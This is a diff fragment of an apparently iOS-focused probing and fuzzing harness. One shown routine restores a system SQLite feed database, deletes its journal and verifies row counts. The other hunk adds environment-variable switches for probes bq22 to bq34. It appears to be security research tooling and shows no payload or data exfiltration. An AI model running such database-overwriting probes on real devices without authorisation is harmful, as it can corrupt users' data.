+            LOG("[bq34] RESTORE FAIL %s", f.lastPathComponent.UTF8String);
+        }
+    }
+    NSString *jrnl = [dbp stringByAppendingString:@"-journal"];
+    [[NSFileManager defaultManager] removeItemAtPath:jrnl error:NULL];
+    bytesBack = bytesBack &&
+        bq18_same(dbp, [bdir stringByAppendingPathComponent:@"db"]);
+    sqlite3 *vdb = NULL;
+    int ent1 = -1, t1 = -1;
+    if (sqlite3_open_v2(dbp.UTF8String, &vdb, SQLITE_OPEN_READONLY,
+                        NULL) == SQLITE_OK) {
+        ent1 = bq18_count(vdb, "SELECT count(*) FROM feedEntries");
+        t1 = bq18_count(vdb, "SELECT count(*) FROM feedEntries "
+                             "WHERE feedId='clock.timers'");
+        sqlite3_close(vdb);
+    }
+    LOG("[bq34] RESTORED rows=%d/%d clock.timers=%d/%d bytes-identical=%d",
+        ent0, ent1, t0, t1, bytesBack ? 1 : 0);
+
+    bad_query_release(h);
+    LOG("[bq34] done");
 }
 
 // ---------------------------------------------------------------------------
@@ -33694,6 +36470,18 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ19")) { p_bq19(); LOG("[probe13] bq19-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ20")) { p_bq20(); LOG("[probe13] bq20-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ21")) { p_bq21(); LOG("[probe13] bq21-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ22")) { p_bq22(); LOG("[probe13] bq22-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ23")) { p_bq23(); LOG("[probe13] bq23-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ24")) { p_bq24(); LOG("[probe13] bq24-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ25")) { p_bq25(); LOG("[probe13] bq25-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ26")) { p_bq26(); LOG("[probe13] bq26-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ27")) { p_bq27(); LOG("[probe13] bq27-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ28")) { p_bq28(); LOG("[probe13] bq28-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ29")) { p_bq29(); LOG("[probe13] bq29-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ30")) { p_bq30(); LOG("[probe13] bq30-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ31")) { p_bq31(); LOG("[probe13] bq31-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ32")) { p_bq32(); LOG("[probe13] bq32-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ34")) { p_bq34(); LOG("[probe13] bq34-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MDNS")) { p_mdns(); LOG("[probe13] mdns-only mode, stop"); return NULL; }
         if (getenv("FUZZ_LSVC2")) { p_lsvc(); p_ipopt(); LOG("[probe13] lsvc2-only mode, stop"); return NULL; }
